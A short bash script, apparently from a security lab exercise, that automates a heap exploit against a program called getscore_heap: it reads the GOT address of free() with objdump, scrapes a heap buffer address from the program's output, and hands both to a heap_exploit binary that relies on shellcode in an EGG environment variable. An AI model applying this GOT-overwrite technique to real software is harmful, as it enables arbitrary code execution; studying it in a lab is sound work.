#!/bin/bash

#extract the address of free() function
free_address=`objdump -R getscore_heap | grep -w "free" | cut -d' ' -f1`
free_address="0x$free_address"

echo $free_address
#extract the address of allocated buffer in the heap memory in getscore_heap program
match_address=`(./getscore_heap AAAA 1111) | (grep "Address of matching_pattern")| (cut -d' ' -f5)`

echo $match_address
#get the environment variable EGG
./heap_exploit 128 $free_address $match_address
